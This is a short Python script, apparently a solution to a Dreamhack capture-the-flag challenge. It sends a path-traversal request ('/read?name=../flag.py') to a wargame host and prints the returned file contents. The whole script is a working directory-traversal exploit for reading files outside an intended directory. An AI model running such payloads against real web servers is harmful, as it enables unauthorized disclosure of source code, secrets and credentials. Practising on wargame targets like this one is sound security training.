import requests

HOST = "http://host3.dreamhack.games"
PORT = "22469"
PAYLOAD = "/read?name=../flag.py"

URL = HOST + ":" + PORT + PAYLOAD

resp = requests.get(URL)

print(resp.text)